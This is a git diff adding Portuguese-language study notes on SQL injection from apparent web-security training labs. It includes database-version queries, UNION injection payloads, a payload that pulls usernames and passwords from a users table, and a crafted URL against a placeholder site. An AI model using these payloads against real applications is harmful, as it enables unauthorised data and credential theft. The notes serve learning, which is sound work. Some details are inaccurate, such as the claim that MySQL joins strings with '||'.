@@ -119,6 +119,47 @@ Juntamos os campos em uma única linha usando um caractere separador (ex: `~` ou
 
 ---
 
+## 7. Examinando base de dados(banco de dados):
+
+Voce pode verificar qual é a versao do banco so usando um comando. Cada banco de dados tem o seu tipo de comando.
+
+## como funciona:
+
+usamos o **SELECT** para selecionar a version. Usamos o @@ para colocar a version como selecionada. Exemplo **SELECT @@version**(isso e para o **mysql**)
+
+## Sintaxe por Banco de Dados:
+
+- **Microsoft, MySQL**
+  `SELECT @@version`
+- **Oráculo**
+  `SELECT * FROM v$version`
+- **Post Gree SQL**
+  `SELECT version()`
+
+## Saida Esperada:
+
+  - `Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+  - Mar 18 2018 09:11:49
+  - Copyright (c) Microsoft Corporation
+  - Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`
+
+## Comando base:
+  - **' UNION SELECT @@version--**
+---
+
+## Lab 8 — Recuperar vários valores em 1 coluna (CONCAT)
+
+- **Objetivo:** Extrair dados (username + password) quando só tem 1 coluna útil de texto.
+- **Método:** Usar CONCAT (MySQL/Oracle usam `||`) pra juntar dados com separador.
+- **Payload:** `' UNION SELECT NULL, username||'~'||password FROM users--`
+- **Como testar:**
+  1. Burp Suite intercepta requisição do filtro
+  2. Testa `' UNION SELECT NULL,'abc'--` → confirma 2 colunas, só 1 é texto
+  3. Injeta payload CONCAT acima
+  4. Resposta mostra: `administrator~s3cure`, `wiener~peter`
+- **Por que funciona:** CONCAT junta fields com `~` como separador → data fica visível numa única coluna
+---
+
 ## Exemplos Práticos de URL no Navegador / Burp Suite
 
 ### 1. Burlar Filtro (Trazer tudo):
@@ -141,5 +182,8 @@ https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL,NULL-- (R
 _(Testando uma por uma até achar qual não dá erro e reflete o 'a' na tela)_
 https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+'a',NULL-- (Testa Coluna 1)
 https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL,'a'-- (Testa Coluna 2)
+
+## 5. Examinando base de dados
+https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+@@version--
 
 > 💡 **Dica de Burp Suite:** Ao injetar diretamente na URL via Proxy/Repeater, lembre-se de codificar os caracteres especiais (`Ctrl + U`). O espaço vira `+` e as aspas simples viram `%27`.
